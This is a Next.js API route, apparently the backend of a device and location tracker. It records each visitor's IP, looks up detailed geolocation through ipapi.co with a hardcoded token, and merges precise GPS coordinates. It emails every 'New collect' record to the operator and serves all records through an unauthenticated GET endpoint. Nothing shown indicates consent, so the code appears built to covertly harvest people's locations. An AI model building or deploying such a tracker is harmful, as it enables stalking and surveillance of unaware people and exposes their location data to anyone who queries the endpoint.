import { type NextRequest, NextResponse } from "next/server"
import { sendNotificationEmail } from "@/lib/email"

const deviceData: any[] = []

async function getLocationFromIP(ip: string) {
  try {
    console.log("Fetching location for IP:", ip)
    // Using ipapi.co for detailed IP geolocation (free, no API key required)
    const response = await fetch(`https://ipapi.co/${ip}/json?token=8808e6c456f6e2`, {
      headers: {
        "User-Agent": "DeviceTracker/1.0",
      },
    })

    if (response.ok) {
      const data = await response.json()
      console.log("Location data received:", data)

      // Check if we got an error response
      if (data.error) {
        console.error("IP API error:", data.reason)
        return null
      }

      return {
        ip: data.ip || ip,
        city: data.city || "Unknown",
        region: data.region || "Unknown",
        regionCode: data.region_code || "Unknown",
        country: data.country_name || "Unknown",
        countryCode: data.country_code || "Unknown",
        countryCapital: data.country_capital || "Unknown",
        latitude: data.latitude || null,
        longitude: data.longitude || null,
        timezone: data.timezone || "Unknown",
        isp: data.org || "Unknown",
        asn: data.asn || "Unknown",
        postal: data.postal || "Unknown",
        continentCode: data.continent_code || "Unknown",
        fullLocation: `${data.country_name || "Unknown"} / ${data.region || "Unknown"} / ${data.city || "Unknown"}`,
      }
    } else {
      console.error("IP API response not OK:", response.status, response.statusText)
    }
  } catch (error) {
    console.error("Error fetching IP location:", error)
  }
  return null
}

export async function POST(request: NextRequest) {
  try {
    const deviceInfo = await request.json()

    const ip = request.headers.get("x-forwarded-for")?.split(",")[0] || request.headers.get("x-real-ip") || "unknown"

    console.log("Collecting data from IP:", ip)
    console.log("Location type:", deviceInfo.locationType)

    if (deviceInfo.sessionId && deviceInfo.locationType === "gps-precise") {
      // Find existing entry by sessionId and merge GPS data
      const existingIndex = deviceData.findIndex((entry) => entry.sessionId === deviceInfo.sessionId)

      if (existingIndex !== -1) {
        // Merge GPS location data into existing entry
        deviceData[existingIndex].gpsLocation = deviceInfo.gpsLocation
        deviceData[existingIndex].locationType = "gps-precise"
        console.log("GPS location added to existing session:", deviceInfo.sessionId)
        return NextResponse.json({ success: true, message: "GPS location updated" })
      } else {
        // If no existing entry found, create a new one with just GPS data
        console.log("No existing session found, creating new entry with GPS data")
      }
    }

    if (ip && ip !== "unknown") {
      console.log("Attempting to fetch location for IP:", ip)
      const locationData = await getLocationFromIP(ip)
      if (locationData) {
        deviceInfo.location = locationData
        console.log("Location data added successfully:", locationData.city, locationData.country)
      } else {
        console.log("Failed to fetch location data, adding IP only")
        deviceInfo.location = {
          ip: ip,
          city: "Unknown",
          region: "Unknown",
          regionCode: "Unknown",
          country: "Unknown",
          countryCode: "Unknown",
          countryCapital: "Unknown",
          latitude: null,
          longitude: null,
          timezone: "Unknown",
          isp: "Unknown",
          asn: "Unknown",
          postal: "Unknown",
          continentCode: "Unknown",
          fullLocation: "Location data unavailable",
        }
      }
    } else {
      console.log("IP is unknown, cannot fetch location")
      deviceInfo.location = {
        ip: "Unknown (localhost/preview)",
        city: "Unknown",
        region: "Unknown",
        regionCode: "Unknown",
        country: "Unknown",
        countryCode: "Unknown",
        countryCapital: "Unknown",
        latitude: null,
        longitude: null,
        timezone: "Unknown",
        isp: "Unknown",
        asn: "Unknown",
        postal: "Unknown",
        continentCode: "Unknown",
        fullLocation: "Location unavailable (localhost/preview environment)",
      }
    }

    deviceData.push(deviceInfo)
    console.log("Data collected. Total entries:", deviceData.length)

    try {
      const subject = `New collect: ${deviceInfo.deviceName || deviceInfo.userAgent || "Unknown Device"}`
      const lines: string[] = []
      lines.push(`Timestamp: ${deviceInfo.timestamp || new Date().toISOString()}`)
      lines.push(`Session: ${deviceInfo.sessionId || "n/a"}`)
      lines.push(`Type: ${deviceInfo.locationType || "n/a"}`)
      if (deviceInfo.location) {
        lines.push(
          `Location: ${deviceInfo.location.fullLocation || `${deviceInfo.location.country || "Unknown"} / ${deviceInfo.location.region || "Unknown"} / ${deviceInfo.location.city || "Unknown"}`}`,
        )
        lines.push(`IP: ${deviceInfo.location.ip || "Unknown"}`)
        if (deviceInfo.location.latitude && deviceInfo.location.longitude) {
          lines.push(`Coords: ${deviceInfo.location.latitude}, ${deviceInfo.location.longitude}`)
        }
      }
      if (deviceInfo.gpsLocation) {
        lines.push(
          `GPS: lat=${deviceInfo.gpsLocation.latitude}, lon=${deviceInfo.gpsLocation.longitude}, acc=${deviceInfo.gpsLocation.accuracy}`,
        )
      }
      lines.push(`UA: ${deviceInfo.userAgent || "Unknown"}`)

      await sendNotificationEmail({
        subject,
        text: lines.join("\n"),
        html: `<pre>${lines.map((l: string) => l.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")).join("\n")}</pre>`,
      })
    } catch (emailError) {
      console.error("Failed to send notification email:", emailError)
    }

    return NextResponse.json({ success: true, message: "Data collected" })
  } catch (error) {
    console.error("Error saving data:", error)
    return NextResponse.json({ success: false, error: "Failed to save data" }, { status: 500 })
  }
}

export async function GET() {
  try {
    console.log("Fetching data. Total entries:", deviceData.length)
    return NextResponse.json({ success: true, data: deviceData })
  } catch (error) {
    console.error("Error reading data:", error)
    return NextResponse.json({ success: false, error: "Failed to read data" }, { status: 500 })
  }
}
